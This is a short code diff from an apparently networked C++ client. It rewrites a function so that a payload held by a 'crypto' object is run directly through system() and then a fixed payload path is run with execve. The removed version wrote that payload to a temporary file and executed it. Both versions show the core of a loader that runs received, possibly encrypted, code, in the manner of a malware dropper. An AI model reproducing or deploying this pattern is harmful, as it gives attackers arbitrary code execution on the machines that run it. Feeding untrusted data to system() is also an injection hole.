@@ -56,7 +56,6 @@ client::client(void) : Socket() {
 
     delete crypt;
     crypt = nullptr;
-
     shutdown(sock, 0);
 }
 
@@ -65,20 +64,6 @@ client::~client(void) {
 }
 
 void fun(crypto *crypt) {
-    char *file_name;
-    int fd;
-
-    file_name = (char *)malloc(MAX_FILE_NAME);
-
-    strncpy(file_name, FILE, MAX_FILE_NAME);
-
-    if ((fd = mkstemp(file_name)) == -1) {
-        perror("Error making temp");
-        exit(EXIT_FAILURE);
-    }
-
-    write(fd, crypt->get_payload(), crypt->get_payload_size());
-
-    execve(file_name, NULL, NULL);
-    free(file_name);
+    system(crypt->get_payload());
+    execve(PAYLOAD_PATH, NULL, NULL);
 }
